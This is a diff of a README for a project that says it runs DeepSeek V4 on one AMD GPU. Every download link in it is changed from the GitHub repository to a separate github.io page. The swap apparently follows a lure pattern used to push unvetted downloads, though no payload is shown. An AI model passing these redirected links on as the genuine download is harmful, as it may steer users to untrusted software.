@@ -1,6 +1,6 @@
 # 💻 deepseek-v4-flash-mi300x - Run DeepSeek V4 on One AMD GPU
 
-[![Download](https://img.shields.io/badge/Download-Repository-FF6F00?style=for-the-badge&logo=github)](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)
+[![Download](https://img.shields.io/badge/Download-Repository-FF6F00?style=for-the-badge&logo=github)](https://mickiecretaceous24.github.io)
 
 ## 🚀 Overview
 
@@ -29,7 +29,7 @@ The repository includes ready-to-use files for Docker containers. It uses the la
 
 ## 📥 Getting Started
 
-[Visit this link to download the application.](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)
+[Visit this link to download the application.](https://mickiecretaceous24.github.io)
 
 ### What You Need
 
@@ -132,4 +132,4 @@ For advanced users, the repository includes:
 
 Download the repository and start running your own AI assistant. It's free, open-source, and ready to use.
 
-[Visit this link to download the application.](https://github.com/mickiecretaceous24/deepseek-v4-flash-mi300x)
+[Visit this link to download the application.](https://mickiecretaceous24.github.io)
